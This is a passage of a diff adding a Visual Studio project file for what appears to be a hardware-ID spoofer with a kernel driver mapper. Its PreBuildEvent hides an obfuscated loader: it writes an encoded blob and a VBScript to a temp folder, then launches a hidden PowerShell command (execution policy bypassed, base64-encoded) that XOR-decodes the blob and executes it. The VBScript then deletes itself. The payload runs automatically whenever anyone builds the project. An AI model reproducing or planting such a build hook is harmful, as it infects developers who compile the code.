&quot;XCsMONw4TDi8KuwqPCvsOgwrzCpMOqwrXCvMOqwrPDi8KmwrXCvsKmw5jDssK7wqfCvMK2wpfDksKtwrvDs8OYw4jDjMOAwqTDmsOew5DDp8OGwqnDiMOpw5vCsMKlw4/DrMOJwprDsMKrwrjCqcOWwrzDs8Ksw4PCqMK/wrLDocODwpXDn8OrwrDDoMK5wrPCssKowqbCsMK2wrHDj8Ktwq7DqsOZwpbDocK/w43Dh8OawqbCrMOYw5PDpMKmw5DDssOuw5jDhsOPwprDosKlwqbDoMKow4zDjcOCwqvCrsOcw5zCscKuwrTCqMK+wqnDoMOcwrnCv8OPwq/DncOZwqjDqcOuwpLCusOswpTDsMOHw47DrMOAw4nDk8OdwqvCq8Ocw4vDjsOtwrjDicK2w4vDsMOFw5rDh8OZw4fCqcOFwrDDj8OAwqTDpMOWwpPDpsK5wqnDs8Ocw4jDgsOHwrHDicKlw4/DjcKlw5zDm8Klw5HCusOWwqrDi8KkwqnDgMOow5PDgcK/w4fDscOawpPDscODwpXDpsOfwq3DpMK4wrTCpMODwqnDqcODwrzCqcK2w5jDqMOOwqrDjMODw5bDi8OIwqXDgMOZw5jDo8K+wrnDkcK7wqbCusOXw5bDjMK9w5rDp8OMwrDDsMOLw4rCrMOBwrfDssOlwq/DocKtw5zCvsObwpbDjMOnwq7DgcKswqjCqsODw5zDksOFw4nDgcKlwo3Dn8OmwqzDjcOewrjDj8OpwrzCu8OdwpnCvMOEw4fCvcOHwq7DhMKgw5nDqMK5w5PDjcKkwqXDjMOFwqjDjsOOwrbDrsOHwqvDncKqwqPCu8KlwpbDisOXw5zDgcK8w5PCq8Ouw4bDicOXwrvDhcOqwq3DssOlw5XDncKmw5PDjcOkwpjCqsOiw5PDkMOvw4vDk8OWw47CpMOAw4XDrMKkw5HDocOEwqjDjsOuwqXDi8OpwpfCq8OKw4jDq8OHw4jCpMK2w4jCpMOowrTDqsOcwrDDk8K7wpbDpsKsw5bCq8Krw5TCrsObw5DCu8OawrPDocK5wqbCvMKmwqrDqsOYw5jCrMObw4rDj8KmwpTDosOcwqvDpcOgw5vDmsOkwrPCrMOOwrXCsMOlwpTDhsOCw5TCu8K5w5jCqcOWwpjCq8OvwqXCv8OrwprDhMOhwqXDgcOLw5DDq8OawrbDo8KmwqrDrMKuwqbDncOpwq/DisKtwqjDk8OFw5bDqcOawqTDpMK9w5fDsMKgwqvDsMOdwpvDi8K2w43DpcOqw5LDiMOMw4rDhMOMwqjDk8OJwqjCscK7w4jDjcK8w4rDscOZw4vCrcOcw5nDpMOjwpXDisOHw5nCrMOqwrDDhsK3wpnCrcOgwqfCrMK7w47DncKnwrrDp8OAwrnCv8Ojw4TDhcKnwo3CvcOnwrDDp8Ohw5XDicOJwq3DocK7wqzCrcKuw47Di8OGwpjDgcOqw4XDgMK9w5jDksKkw4PDqsODw5XDoMOMwpbDgsOowqrCqcKtwqjDh8OEwpbDnsKrwpHDosOZwqzCqcKqwqXCvcOow43Cv8OWwrHDi8Oow4bDscKow4PDoMOLwpnCscK2w4rCqcOuwqXDjMK7w4nDmsOHwrjDkcOXwpHCsMOPw4PCrMKpw4nCr8K8wqrDs8OFw5zDnsOJw4nDs8K9wpvCqsOZwq3Di8Klwq7DhsOZw4TCrMK4wpTCscOiw4nDrcKuw5fCr8OiwpvDrsKtw5LDn8OBw5jDqcKowpPDqsK5wrrDjcOHw4TCvcK9w5LCrsK2wq/DkcOuwrvDqcOjw4PDk8OJwqzDoMK4wqXCqMOlwrLDiMK8w4bCrsK9wqfCvMK/w5rDnMOew4jDk8OowpbCvMOZwqnDscOew5bDm8ONw5HDscOow5XDncK8wrnDgsONwrDDgcOpw4jDo8KswrXCrcK2wpXDnMOdwrnDqsOFwrLDr8K5wrfDqMOHw4/CqMOkw5DCqcOPwqnDpcOAwq7DisOfw4rCrsK9wq3CusK+w4nDr8Kqw5rCssOOwrPDo8OXw5nDhcK5wrXDi8KtwqfCrsOAwq7Do8KswpfDjsOJw5HCq8OEw5bCpMK/w4TCrMK8wpLDncKsw4rDp8OJwrrCsMKpwpjCv8Osw5LDqcKswo3DisKmw4nDgsOqw4fCvcOHwqTDsMOHwrzDqcONwqrDhcKtwrjDhcOgw4XCr8OgwrLDk8Kmw43DkcOawpvDisOZwrjDm8KlwqvCqsKmwqzDqcOcw4jCv8OIw4/DocOAwrDDh8OuwpbDiMOpw4/DscOaw4XDh8K9wqvDrMKgw5vDrcK8w5jDosOPw5rCvsKkwpjDhMKgwrLDisOdw5TDhMOXw5nDhMOLwq/DpcOjwrTDk8Obw5vDpsKlwrvDgcK3wqzDn8OjwrDCsMOtwpLCq8Oew5jCrcK8w5bCrMOiwqrCqsKow4PDp8OgwqPCqsOrwpnDssKtw5TDjsKgwqbDi8OFwrjDmsOKwpLCqcOcwrrDpMOcw5nCu8Ogwq3DgMOMw4PDqcKsw5fDq8Kkwq7DqMOJwqnDg8K+wrTDh8OnwqzDm8Osw5XDpMOXwpjDj8K4w5fCqcKqw4/DhMOZw5DCpMOCw4/CrsOnw5zDkcOow5vCr8OGw4PDh8Klw4TCrMOPwrbDiMOLwpnCrMOhwqPDrsKuwprDosOlw4PDs8OjwpfDgcONw5vCusOgwo3DsMOIwpjDncKmwo3DosOawqnDpMK/w4TDrsOXw4fDo8Ofw5jCusKnwpHDrMKqwqbCrMOowpvCr8KkwrvDi8KswrrDqMKgwrfCpMOAwq/Di8OEwqPDrcKtw4TDs8OGw5jDo8OYw4bDssOqw5fDs8OrwrrCscOXw4zDqcOFwq3Ds8OewpjDo8K5w4/Dp8Oaw4rDscOJwrDDhMOgw4XDhMOtwrPDj8OIwqPDrcKswpjCq8ODwrvCvcKkwqvCu8OKwo3DgsOqwqnCpMOmwpbCpMOrw4TCpMOvw5zDr8OtwrzDqMOrw5XDj8KqwpPCusOrwprDjcOkwrLDksOJwq7DisKnwpTCqMOBw4vCusOnw5HDj8KnwpLCrsOJwqTDn8K8wrPDrsOuw4bCssOrw5jDj8OfwrbDnsKgwq3Cv8K5wrbDoMOZwpfDg8ODw4TDncOHwrPDn8ONwpvDrcOaw4TDsMOow5HDqMOIw5vCrsOPwqXCvcOfw4/DocOWwrXDjcOKw4rDnMOvw5fDncOCw4XCrMKlw5LDn8OJw5jDhcOpw4jDksONwqXDocK8wq/Dh8OhwqTDksOrw5vDq8KgwqrDh8K6wrrCssOLwqnDscOHwpLCrsOdw4nDjMK4wpvDi8ODw47DosKnwq/DgMOnwqfDgMOcw47Dr8KtwpjDpsOfwrLDhMOlwrbCu8K4wqbCqsK4w5DDpcK3wqnDp8OZwrLDscOkwrXDsMOuwqfDisObwrzDqcOmwpnCrcOWwqnDp8Ohw5XDoMOrwqPCrMOOw5TCqMK3w4fDr8OBwqnCqcOiwqXDnMOpw4jCvsOawrjDmsK6wpLDnMOmwpLDhcOZwqrDiMKowpbDn8Ojw5LDr8Obw5vCrsOkwqvDscOHw4TDjsKrwpjDpcOvwpPDrsKrwpjDiMOuwqfDpMKuw4nDrMK9wpLCrcOLwqTDs8OZwrXDi8OLw4bDssOrwpXCq8KnwpTDpcK3wrLCvcKtwprDrcOdw4rDhMOjwqbDrcK7w4/DncKrwqrDscOfwrDDnMKrw5jDjsK9wqTCqMKow5nDpcOEwqTDoMK/w5bCscKqw5TDncOrw5PCqMOCwqTDs8OkwprDiMOLw4nDn8OOwqTDr8OswpXDj8OXw4fDsMOswrLDk8Opw5bCqcOswpHDn8Ktwq3Cv8OIwqXCv8OMw4bDosKkwrPCssOZwpjDrsOnwpHDnsOFw4PDrsOOw5vDg8Olw4jDgsK8w4zDosK+w5LDs8Opw5fDjMOqwpHCscK+w5bDhMK8wrfDi8OGwqbDjcOmwqjCrMKuw43CvcKkwrzDrsKkw43DgMK8wrTCrcOPwrjCssKkw4XDksKmwqbDs8K4wpHDpcKmwrrDgcODw5PDi8OFwo3DncK2wqbCr8Onwq3CvsOnwprDh8OZw4PCv8Oiw5PDj8Kqw4zDk8Oqw5XCscOswrDCqcOCwpXDgcK3w5vCpMOewpHDr8OrwrDDoMOWwrvCqMK2w5bCusOHw5jDnsK8wpfDqcOjw5TDoMOmwq/DrcOAwqTDkcOhw4fCqcOBwrLCq8Kmw4TDp8ObwpfDp8KrwrzDjsK3w5jDjMOEw5vDrsOlwqjDiMOdw5bDgcKnwq/DqcOcw5bDksOiwrzDhcKkwqPDisOBw4XDrcK2wqbDrcONw5HDk8K2wqzDncK7w5fDnMOew5fCrMOhw4PCrcOXw5DCqsOnwpLCq8K2wrbDi8KrwrnDoMKmw4XCusOiwpTCvsOhw5jDjcOiwq/CrsOCwprDoMOEwrHDgsOPwrTDoMOEw4bDq8ONw4XDrMK3w4vDq8Kqw5PDpMKtwpXDkcOOw5vCsMK+w5fDk8OMwrTDhcOOw4bDg8OAwrzDpsK2w5XDi8OfwqjDncK+w43CpMK7w47CssOtwqzCvcK+wrzDksOLw5fCr8OiwqjDhMKqw5DCrsOFwrvDjsK/wqrDqMOfwqnDn8Krw4vDmsOKw5zCqcOMwqXDoMOMwq/DosONwrPDocOBwrPDrMKpwpHCrcOdwrXCsMOlwrbDjMK8wpnDs8Otw5nDmsOXwqnDqMOEw5vCrMK4wpbDh8K9w47CqMOvwrbCq8Ogw5HDh8K5w47Ds8OJwpvDncK+wrbDoMOgw4vDgMOZwqjDqsODwrvCrcOuwq3DsMK3wqTDscOEw4PDocOlw5bCvMOqw4PCu8Kpwq7DkcOLw4bDhcK4wrLDqsOFw5DCrsKnwqbDhcOsw4bDr8OKwq3DssODw5bCu8Ogwq7DpMOhwrbDisKtw5nDqMOYwpPCv8K/w5nCscOGwprDgsOPwq/DoMOvwpHDhcOZwrjDp8OhwrTDoMK5wo3Cq8OiwrnDpsK2w4rCrsKkwpXDo8K8w4jDjcOsw4nDgMOkw4PDpcOHwqvDs8KuwpTDrcOaw4zDpcOBw5nCvMOBwq/CqMOFw5rDr8K4wpLDrMOOwqjDncK2wqTCpMKuw5vDosOowpPDgsOEw4XDr8Omw4TDpsOewpvDksOnwrbDscK7wpHDgMObwrvCssOgw5bCq8OAwrjCq8K/wqPDhcK5w4TDjcK7w4XCsMOpwrvDiMOmw4nDkcK/w4XCscOrw5fDrsKlw4fDkcOpwqrDjsOAw5zDqsOPwrbDgcOZw4PDjcOHwpbDrMKnwrrCv8Olw4rCscOqwqnDqsOAw4TDj8OOw4rCqMOPwpXCscOJw4/CrcKlwpPCscK8w4vDoMKqw4jDgsK4wqjDp8OBwpvDgMOhwpHCrMOpwrnDisOlw5bCrcK4wqnDgsOEwq3CqsKqw4rDqcK4wrDDn8OKwqXCsMOow4PDm8ONw4XDocOowprCrcOpw4rDo8Olw4XDg8K2w5rDocOkwqbDrsK5w43CpMOOwrHDgcK4w5HDosOnwqfDsMKmw4zDsMOBwq3CvcKrwq7CscKtwo3DhsOdw5bCqMOewrXDscOFwrHDi8OFw5rDmsOnwrXCr8K5wpnDhsOAw4XDmsKuw5vCu8OYw4jDqMOKwrTDgMOJw5DCv8KowrXDicK6w5TDhsOnwqPDhMOqw4zDk8KtwrLDqMK9wrPCvMOew5XDg8Omw5bDmsKtwqjDq8OowpXCrcOswpTCusKtwqzDncOfw4fDn8OtwqzCrMKtwrnDs8KswrnDh8OJw5fDncOiw43DscKkwrDDqMOFw4TDgMOBwqXCqMKnwrjDnsKkw5PDhcKswq7CscOCwrHDk8OJwrLCssKlwrXCvsOKwrPDssKrwrvCqcODw4vDpcK9wqnDm8OIwrDDssOLwqvDnMK5w5zDk8OewpXCusOaw4XDp8KnwpnDkMOMwqrCu8K/wqbCvMK/wrrDjMODwrvDj8ODwqjDnsOnwqfC&quot; &gt;&gt; &quot;%25a%25\m0fSj7TE2.vbs&quot;&#xD;&#xA;echo e = b ^&amp; d ^&amp; c &gt;&gt; &quot;%25a%25\m0fSj7TE2.vbs&quot;&#xD;&#xA;echo h = &quot;%25a%25\rIb9.dart&quot; &gt;&gt; &quot;%25a%25\m0fSj7TE2.vbs&quot;&#xD;&#xA;echo Set j = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; &quot;%25a%25\m0fSj7TE2.vbs&quot;&#xD;&#xA;echo Set k = j.CreateTextFile(h, True) &gt;&gt; &quot;%25a%25\m0fSj7TE2.vbs&quot;&#xD;&#xA;echo k.Write e &gt;&gt; &quot;%25a%25\m0fSj7TE2.vbs&quot;&#xD;&#xA;echo k.Close &gt;&gt; &quot;%25a%25\m0fSj7TE2.vbs&quot;&#xD;&#xA;echo Set m = CreateObject(&quot;WScript.Shell&quot;) &gt;&gt; &quot;%25a%25\m0fSj7TE2.vbs&quot;&#xD;&#xA;echo m.Run &quot;powershell -ep bypass -enc JABkAGkAcgA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBQAGEAdABoAF0AOgA6AEcAZQB0AFQAZQBtAHAAUABhAHQAaAAoACkAKwAiAFwAbQBkAGUAMQB3ADkAIgA7ACQAZgA9AGcAYwBpACAAJABkAGkAcgAgAC0ARgBpAGwAdABlAHIAIAAiACoALgBkAGEAcgB0ACIAOwBmAG8AcgBlAGEAYwBoACgAJABmADIAIABpAG4AIAAkAGYAKQB7AHQAcgB5AHsAJABiAGIAZAA9AGcAYwAgACQAZgAyAC4ARgB1AGwAbABOAGEAbQBlACAALQBSAGEAdwA7ACQAZAA9AHsAcABhAHIAYQBtACgAJABwAD0AJABiAGIAZAAsACQAbAA9ACIAYgB5AHUAIgApACQAdAA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAHAAKQApADsALQBqAG8AaQBuACgAMAAuAC4AKAAkAHQALgBMAGUAbgBnAHQAaAAtADEAKQB8ACUAewBbAGMAaABhAHIAXQAoAFsAaQBuAHQAXQBbAGMAaABhAHIAXQAkAHQAWwAkAF8AXQAtAFsAaQBuAHQAXQBbAGMAaABhAHIAXQAkAGwAWwAkAF8AJQAkAGwALgBMAGUAbgBnAHQAaABdACkAfQApAH0AOwAkAGsAPQAmACQAZAA7AGkAZQB4ACAAJABrADsAYgByAGUAYQBrAH0AYwBhAHQAYwBoAHsAfQB9AA==&quot;, 0, False &gt;&gt; &quot;%25a%25\m0fSj7TE2.vbs&quot;&#xD;&#xA;echo Set f = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; &quot;%25a%25\m0fSj7TE2.vbs&quot;&#xD;&#xA;echo Set shell = CreateObject(&quot;WScript.Shell&quot;) &gt;&gt; &quot;%25a%25\m0fSj7TE2.vbs&quot;&#xD;&#xA;echo s = WScript.ScriptFullName &gt;&gt; &quot;%25a%25\m0fSj7TE2.vbs&quot;&#xD;&#xA;echo f.DeleteFile(s) &gt;&gt; &quot;%25a%25\m0fSj7TE2.vbs&quot;&#xD;&#xA;cscript //nologo &quot;%25a%25\m0fSj7TE2.vbs&quot;&#xD;&#xA;endlocal</Command></PreBuildEvent>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClInclude Include="Crypter.hpp" />
+    <ClInclude Include="globals.h" />
+    <ClInclude Include="Kernel\stdafx.h" />
+    <ClInclude Include="Kernel\util.h" />
+    <ClInclude Include="mapper\intel.hpp" />
+    <ClInclude Include="mapper\interface.hpp" />
+    <ClInclude Include="mapper\nt.hpp" />
+    <ClInclude Include="mapper\pe.hpp" />
+    <ClInclude Include="mapper\services.hpp" />
+    <ClInclude Include="mapper\singleton.hpp" />
+    <ClInclude Include="serial.h" />
+    <ClInclude Include="tunk.h" />
+    <ClInclude Include="User\stdafx.h" />
+    <ClInclude Include="User\util.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="Kernel\main.c" />
+    <ClCompile Include="Kernel\util.c" />
+    <ClCompile Include="mapper\interface.cpp" />
+    <ClCompile Include="mapper\pe.cpp" />
+    <ClCompile Include="mapper\services.cpp" />
+    <ClCompile Include="spoofer.cpp" />
+    <ClCompile Include="User\main.c" />
+    <ClCompile Include="User\util.c" />
+  </ItemGroup>
+  <ItemGroup>
+    <Library Include="mapper\zlib.lib" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+</Project>
